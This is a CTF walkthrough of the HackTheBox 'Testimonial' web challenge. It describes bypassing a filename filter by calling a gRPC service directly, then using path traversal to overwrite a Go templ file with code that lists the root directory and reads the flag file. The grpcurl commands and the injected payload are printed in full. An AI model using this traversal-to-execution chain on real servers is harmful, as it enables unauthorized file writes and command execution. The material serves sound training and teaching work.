---
name: Testimonial (2024)
event: HackTheBox Cyber Apocalypse CTF 2024
category: Web
description: Writeup for Testimonial (Web) - HackTheBox Cyber Apocalypse CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Testimonial

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/-vhl8ixthO4/0.jpg)](https://www.youtube.com/watch?v=-vhl8ixthO4?t=2016 "HackTheBox Cyber Apocalypse '24: Testimonial (web)")

## Description

> As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction's hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.

## Solution

We have a Go application with two ports (`1337` and `50045`) that allows us to submit a testimonial, along with our name. Initial tests don't yield any results, so we may as well check the source code.

Tip: you can install VSCode extensions for syntax highlighting, I recommend the `templ` one for this challenge.

Note, when running the local docker instance, I immediately notice a warning message.

{% code overflow="wrap" %}
```bash
(!) templ version check: generator v0.2.598 is newer than templ version v0.2.543 found in go.mod file, consider running `go get -u github.com/a-h/templ` to upgrade
```
{% endcode %}

I saw this on another challenge (`LockTalk` - `python-jwt`) and it also caught my attention. In that case, the JWT package was out-of-date and there was a known vulnerability. Let's see if this challenge is the same 🤞

We are using the [v0.2.543 version](https://github.com/a-h/templ/releases/tag/v0.2.543) but it is only 3 months old. The only release since is ~1 week ago so it's highly unlikely to be the intended path. Furthermore, I don't see any patched security issues in the changelog.

Checking the `entrypoint.sh` file, the flag filename is randomised and it's moved to the root directory, hinting our goal is RCE.

{% code overflow="wrap" %}
```bash
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
```
{% endcode %}

Let's give the code to ChatGPT for a quick summary.

### ChatGPT

**Application Structure:**

1. **RickyService (gRPC Service):**
    - Defines a single RPC method `SubmitTestimonial` for submitting testimonials.
2. **TestimonialSubmission Message:**
    - Contains information about a testimonial, including `customer` and `testimonial` fields.
3. **GenericReply Message:**
    - Represents a generic reply with a `message` field.
4. **Server (`main.go` and `grpc.go`):**
    - Uses Chi router to serve static files from the "public" directory.
    - Implements a gRPC server with a single service (`RickyService`) and a method (`SubmitTestimonial`).
5. **Client (`client.go`):**
    - Provides a gRPC client for submitting testimonials.
6. **Handlers (`home.go` and `shared.go`):**
    - Handles HTTP requests, allowing users to submit testimonials via the web interface.

**Workflow:**

1. Clients can submit testimonials via the web interface by accessing the home page.
2. The `HandleHomeIndex` function processes the submitted data, sanitizes it, and sends it to the gRPC server using the client.
3. The gRPC server receives the testimonial, processes it, and returns a generic reply.

**Important Notes:**

-   The application uses Protocol Buffers for defining messages and gRPC for communication.
-   The server serves static files using the Chi router and implements a gRPC server.
-   The client communicates with the gRPC server to submit testimonials.
-   The `ptypes.proto` file defines the message and service contracts.
-   Generated Go files (`ptypes_grpc.pb.go` and `ptypes.pb.go`) provide implementations of the defined messages and service.

What can I take away from this? Probably to investigate `gRPC`, `Chi router`, and `Protocol Buffers` to see if there are any common vulns/attacks. I don't know much about any of those things _or_ `golang`, so I analysing the code is painful.

While transferring the code to ChatGPT, one particular function stood out for obvious reasons.

{% code overflow="wrap" %}
```go
func (c *Client) SendTestimonial(customer, testimonial string) error {
	ctx := context.Background()
	// Filter bad characters.
	for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
		customer = strings.ReplaceAll(customer, char, "")
	}

	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}
```
{% endcode %}

Note: ChatGPT spotted the code but attributed it to the wrong function (`HandleHomeIndex`), in a completely different file. You had one job ChatGPT!! I tried to ask about potential vulns but it _really_ did not want to play. Guess we will do this the old way 🧠

One interesting thing is the code indicates that the testimonials we submit are written to `public/testimonials/` but every time I check the directory in the browser there is only `1.txt 2.txt 3.txt`.

Eventually I spotted the `0644` perms and got a shell on the local docker instance to confirm files were being written, they just weren't publicly viewable.

{% code overflow="wrap" %}
```go
err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
```
{% endcode %}

There are some good gRPC tools and resources on [this repo](https://github.com/grpc-ecosystem/awesome-grpc).

Maybe we can interact with the service on port `50045` directly using [grpcurl](https://github.com/fullstorydev/grpcurl).

We'll start by [listing services](https://github.com/fullstorydev/grpcurl?tab=readme-ov-file#listing-services).

Unfortunately, lots of commands fail due to not supporting the reflection API.

{% code overflow="wrap" %}
```bash
./grpcurl -plaintext 127.0.0.1:50045 list

Failed to list services: server does not support the reflection API
```
{% endcode %}

We can list the services by specifying the proto file.

{% code overflow="wrap" %}
```bash
./grpcurl -import-path ../challenge/pb/ -proto ptypes.proto list

RickyService
```
{% endcode %}

Next, describe the service.

{% code overflow="wrap" %}
```bash
./grpcurl -import-path ../challenge/pb/ -proto ptypes.proto describe RickyService

RickyService is a service:
service RickyService {
  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
}
```
{% endcode %}

And method.

{% code overflow="wrap" %}
```bash
./grpcurl -import-path ../challenge/pb/ -proto ptypes.proto describe RickyService.SubmitTestimonial

RickyService.SubmitTestimonial is a method:
rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
```
{% endcode %}

Try again to invoke the RPC.

{% code overflow="wrap" %}
```bash
./grpcurl -plaintext 127.0.0.1:50045 RickyService.TestimonialSubmission

Error invoking method "RickyService.TestimonialSubmission": failed to query for service descriptor "RickyService": server does not support the reflection API
```
{% endcode %}

According to the docs:

> To use `grpcurl` on servers that do not support reflection, you can use `.proto` source files.

> In addition to using `-proto` flags to point `grpcurl` at the relevant proto source file(s), you may also need to supply `-import-path` flags to tell `grpcurl` the folders from which dependencies can be imported.

{% code overflow="wrap" %}
```bash
./grpcurl -plaintext -d '{"customer": "test", "testimonial": "test"}' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial

{
  "message": "Testimonial submitted successfully"
}
```
{% endcode %}

When we check the webpage, we will see our submission! We've essentially bypassed the blacklist filter by submitting the testimonial directly.

Let's confirm that.

{% code overflow="wrap" %}
```bash
./grpcurl -plaintext -d '{"customer": "<script>alert(0)</script>", "testimonial": "test"}' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial

ERROR:
  Code: Unknown
  Message: open public/testimonials/<script>alert(0)</script>: no such file or directory
```
{% endcode %}

It failed to open that file, because it failed to read the filename. Remember:

{% code overflow="wrap" %}
```go
err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
if err != nil {
	return nil, err
}
```
{% endcode %}

How about directory traversal? If we input `../../../../test.txt`, will it be written to `/`?

{% code overflow="wrap" %}
```bash
./grpcurl -plaintext -d '{"customer": "../../../../test.txt", "testimonial": "test"}' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial

{
  "message": "Testimonial submitted successfully"
}
```
{% endcode %}

We can check the local docker instance.

{% code overflow="wrap" %}
```bash
docker exec -it web_testimonial bash

~ # ls /
bin                 flagc5f171e16f.txt  mnt                 sbin                usr
challenge           go                  opt                 srv                 var
dev                 home                proc                sys
entrypoint.sh       lib                 root                test.txt
etc                 media               run                 tmp
```
{% endcode %}

It is! The next part took me a long time - trying to work out how to gain RCE. I was mostly trying to inject payloads into the page, to no avail. In the end, I used the path traversal vuln to replace `index.templ` with a malicious one.

{% code overflow="wrap" %}
```go
package home

import (
    "os/exec"
    "strings"
)

func hack() []string {
    output, _ := exec.Command("ls", "/").CombinedOutput()
    lines := strings.Fields(string(output))
    return lines
}

templ Index() {
    @template(hack())
}

templ template(items []string) {
    for _, item := range items {
        {item}
    }
}
```
{% endcode %}

Ask ChatGPT to escape it for me ofc 😁

{% code overflow="wrap" %}
```bash
./grpcurl -plaintext -d '{"customer": "../../view/home/index.templ", "testimonial": "package home\n\nimport (\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\"ls\", \"/\").CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}" }' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial

{
  "message": "Testimonial submitted successfully"
}
```
{% endcode %}

Reload the page and get the flag filename, then update our command.

{% code overflow="wrap" %}
```bash
./grpcurl -plaintext -d '{"customer": "../../view/home/index.templ", "testimonial": "package home\n\nimport (\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\"cat\", \"/flagbba4cb647c.txt\").CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}" }' -import-path challenge/pb/ -proto ptypes.proto 127.0.0.1:50045 RickyService.SubmitTestimonial

{
  "message": "Testimonial submitted successfully"
}
```
{% endcode %}

Flag: `HTB{w34kly_t35t3d_t3mplate5}`
